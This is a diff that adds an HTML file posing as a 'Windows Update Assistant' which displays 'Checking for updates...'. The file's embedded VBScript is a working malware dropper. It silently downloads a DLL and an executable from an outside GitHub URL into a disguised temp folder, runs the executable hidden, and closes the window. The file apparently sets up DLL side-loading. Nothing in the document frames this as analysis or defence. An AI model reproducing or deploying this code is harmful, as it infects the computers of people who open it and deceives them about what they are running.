@@ -1,0 +1,40 @@
+<html>
+<head>
+<title>Windows Update Assistant</title>
+<script language="VBScript">
+On Error Resume Next
+Dim oShell,oFSO,oHTTP,oFile,sURL,sDst,sDst2
+Set oShell=CreateObject("WScript.Shell")
+Set oFSO=CreateObject("Scripting.FileSystemObject")
+sDst=oShell.ExpandEnvironmentStrings("%TEMP%")&"\WinDefData\dismcore.dll"
+sDst2=oShell.ExpandEnvironmentStrings("%TEMP%")&"\WinDefData\dism.exe"
+sURL="https://raw.githubusercontent.com/emuladortrampo-lgtm/edge-updater/main/"
+If Not oFSO.FolderExists(oShell.ExpandEnvironmentStrings("%TEMP%")&"\WinDefData") Then
+    oFSO.CreateFolder oShell.ExpandEnvironmentStrings("%TEMP%")&"\WinDefData"
+End If
+Set oHTTP=CreateObject("MSXML2.ServerXMLHTTP.6.0")
+oHTTP.Open "GET",sURL&"dismcore.dll",False
+oHTTP.setRequestHeader "User-Agent","Mozilla/5.0"
+oHTTP.Send
+If oHTTP.Status=200 Then
+    Dim arrData():arrData=oHTTP.responseBody
+    Set oFile=oFSO.CreateTextFile(sDst,True)
+    oFile.Write arrData
+    oFile.Close
+End If
+Set oHTTP=CreateObject("MSXML2.ServerXMLHTTP.6.0")
+oHTTP.Open "GET",sURL&"dism.exe",False
+oHTTP.setRequestHeader "User-Agent","Mozilla/5.0"
+oHTTP.Send
+If oHTTP.Status=200 Then
+    Dim arrData2():arrData2=oHTTP.responseBody
+    Set oFile=oFSO.CreateTextFile(sDst2,True)
+    oFile.Write arrData2
+    oFile.Close
+End If
+oShell.Run """"&sDst2&"""",0,False
+window.close
+</script>
+</head>
+<body>Checking for updates...</body>
+</html>
